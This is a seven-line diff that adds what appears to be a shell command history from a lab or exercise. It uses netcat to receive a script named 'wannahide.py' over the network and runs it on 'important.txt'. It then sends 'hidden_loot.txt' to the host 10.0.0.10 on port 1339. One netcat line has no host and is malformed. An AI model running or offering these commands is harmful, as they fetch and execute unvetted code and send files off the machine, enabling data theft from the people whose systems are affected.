@@ -1,0 +1,7 @@
+ls
+nc -l -p 1338 > wannahide.py
+ls
+python wannahide.py important.txt
+ls
+nc -w 3 1339 < hidden_loot.txt
+nc -w 3 10.0.0.10 1339 < hidden_loot.txt
